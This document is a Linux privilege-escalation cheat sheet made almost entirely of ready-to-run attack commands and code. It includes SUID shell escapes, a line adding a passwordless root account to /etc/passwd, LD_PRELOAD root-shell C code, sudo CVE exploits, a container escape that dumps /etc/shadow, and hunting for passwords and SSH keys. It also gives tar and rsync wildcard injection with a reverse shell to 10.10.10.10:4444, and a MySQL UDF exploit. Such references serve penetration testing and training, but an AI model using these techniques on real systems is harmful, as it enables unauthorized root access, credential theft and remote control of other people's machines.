# Linux Privilege Escalation Cheat Sheet

## Enumeration Scripts

```bash
# LinPEAS (recommended)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1  # Level 1
./lse.sh -l 2  # Level 2

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

---

## System Information

```bash
# Kernel version
uname -a
cat /proc/version
cat /etc/issue
cat /etc/*-release

# Hostname
hostname

# CPU architecture
lscpu
cat /proc/cpuinfo

# Environment variables
env
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
```

---

## User Enumeration

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/passwd | cut -d':' -f1  # Just usernames
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'  # Root users

# Currently logged in
w
who
last
lastlog

# User history
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history

# Sudo privileges
sudo -l

# Groups
groups
cat /etc/group
```

---

## Network Information

```bash
# Network interfaces
ifconfig
ip a
ip addr show

# Network connections
netstat -antup
ss -antup
netstat -tulpn

# Routing
route
ip route
cat /etc/networks

# ARP table
arp -a
ip neigh

# Open ports
netstat -ano
```

---

## Running Processes & Services

```bash
# Processes
ps aux
ps -ef
top
htop

# Process tree
pstree -p

# Services
systemctl list-units --type=service
service --status-all

# Running as root
ps aux | grep root
ps -U root -u root u
```

---

## Scheduled Tasks

```bash
# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# Systemd timers
systemctl list-timers --all

# Check for writable cron directories
ls -ld /etc/cron.*
```

---

## SUID/SGID Files

```bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 2>/dev/null

# Check GTFOBins for exploitation
https://gtfobins.github.io/
```

### Common SUID Exploits

```bash
# find
find . -exec /bin/sh -p \; -quit
find . -exec /bin/bash -p \; -quit

# vim/vi
vim -c ':!/bin/sh'
vim -c ':set shell=/bin/sh'

# nmap (old versions)
nmap --interactive
!sh

# less/more
less /etc/passwd
!/bin/sh

# cp (copy /etc/passwd)
LFILE=/etc/passwd
cp "$LFILE" /tmp/passwd.bak
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak "$LFILE"

# nano
nano
^R^X
reset; sh 1>&0 2>&0

# awk
awk 'BEGIN {system("/bin/sh")}'

# perl
perl -e 'exec "/bin/sh";'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# ruby
ruby -e 'exec "/bin/sh"'

# lua
lua -e 'os.execute("/bin/sh")'

# git (versions < 2.17.1)
PAGER='sh -c "exec sh 0<&1"' git -p help

# env
env /bin/sh -p

# man
man man
!/bin/sh

# systemctl
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

---

## Capabilities

```bash
# List capabilities
getcap -r / 2>/dev/null

# Common capability exploits
# cap_setuid
/path/to/binary -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search (read any file)
tar -czf /tmp/backup.tar.gz /etc/shadow

# cap_sys_admin
# Can mount filesystems
```

---

## Writable Files & Directories

```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null

# Check /etc/passwd writability
ls -l /etc/passwd

# Check /etc/shadow readability
ls -l /etc/shadow

# Check important config files
ls -l /etc/exports
ls -l /etc/fstab
ls -l /etc/crontab
```

---

## Sudo Exploitation

```bash
# Check sudo version
sudo -V

# Check sudo privileges
sudo -l

# Sudo with NOPASSWD
# Can run specific commands without password

# Sudo with LD_PRELOAD
# Create malicious library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <sudo_command>

# Sudo version exploits
# CVE-2021-3156 (Baron Samedit)
# Affects sudo < 1.9.5p2
./sudo-exploit

# CVE-2019-14287
# Affects sudo < 1.8.28
# If (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
```

---

## Kernel Exploits

```bash
# Check kernel version
uname -a
uname -r

# Search exploits
searchsploit kernel <version>
searchsploit ubuntu <version>

# Common kernel exploits
# Dirty COW (CVE-2016-5195)
# DirtyCred (CVE-2022-0847)
# PwnKit (CVE-2021-4034)
```

---

## NFS Exploitation

```bash
# Check NFS shares
cat /etc/exports
showmount -e <target>

# If no_root_squash
# Mount on attacker machine
mount -t nfs <target>:/share /mnt/nfs

# Create SUID shell
cp /bin/bash /mnt/nfs/bash
chmod +xs /mnt/nfs/bash

# Execute on target
/share/bash -p
```

---

## Docker Escape

```bash
# Check if in docker
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# If user in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
docker run --rm -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host

# Mount host filesystem
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

---

## Password Hunting

```bash
# Search for passwords in files
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
grep --color=auto -rnw '/' -ie "DB_PASS" --color=always 2>/dev/null
grep --color=auto -rnw '/' -ie "DB_PASSWORD" --color=always 2>/dev/null
grep --color=auto -rnw '/' -ie "DB_USER" --color=always 2>/dev/null

# Config files
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat ~/.ssh/config

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Database files
locate password | more
locate pass | more
locate pwd | more

# Web directories
cat /var/www/html/config.php
cat /var/www/html/.htpasswd
```

---

## Wildcard Injection

```bash
# tar wildcard exploit
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/shell.sh
chmod +x /tmp/shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh /tmp/shell.sh"

# When tar runs: tar -czf backup.tar.gz *
# It will execute shell.sh

# rsync wildcard
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > shell.sh
echo "" > "-e sh shell.sh"
# When rsync runs: rsync -a *.sh dest/
```

---

## PATH Hijacking

```bash
# Check PATH
echo $PATH

# If script uses relative paths
# Create malicious binary
cat > /tmp/ls << EOF
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Modify PATH
export PATH=/tmp:$PATH

# Execute vulnerable script
./script.sh

# Execute SUID bash
/tmp/bash -p
```

---

## LD_PRELOAD Exploitation

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# If env_keep+=LD_PRELOAD in sudo
sudo LD_PRELOAD=/tmp/shell.so <command>
```

---

## MySQL/Database Privesc

```bash
# MySQL UDF exploit
# If running as root

# Create malicious UDF
gcc -shared -fPIC -o raptor_udf.so raptor_udf.c
mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf.so';
create function do_system returns integer soname 'raptor_udf.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit;
/tmp/rootbash -p
```

---

## LXC/LXD Privesc

```bash
# If user in lxd group
# Build Alpine image on attacker
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine

# Transfer to target
python3 -m http.server 80

# On target
wget http://attacker/alpine.tar.gz
lxc image import alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

# Now inside container with access to host root filesystem
cd /mnt/root/root
```

---

## Checklist

- [ ] Run enumeration scripts (LinPEAS, LinEnum)
- [ ] Check sudo privileges (sudo -l)
- [ ] Find SUID/SGID binaries
- [ ] Check capabilities
- [ ] Search for passwords and credentials
- [ ] Check cron jobs for writable scripts
- [ ] Check for writable /etc/passwd
- [ ] Look for kernel exploits
- [ ] Check NFS shares
- [ ] Check for docker/lxc membership
- [ ] Review running processes
- [ ] Check scheduled tasks
- [ ] Look for SSH keys
- [ ] Review application config files
- [ ] Check PATH for hijacking
- [ ] Look for wildcard injection opportunities
- [ ] Check database access

---

## Resources

- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Linux PrivEsc Course: https://www.udemy.com/course/linux-privilege-escalation/
